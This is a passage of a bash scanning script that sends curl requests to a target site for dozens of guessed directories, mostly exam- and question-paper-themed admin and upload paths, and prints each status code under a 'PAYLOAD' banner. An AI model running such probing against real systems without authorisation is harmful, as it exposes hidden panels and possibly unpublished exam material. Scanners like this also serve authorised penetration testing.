payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPSystem/"]: "
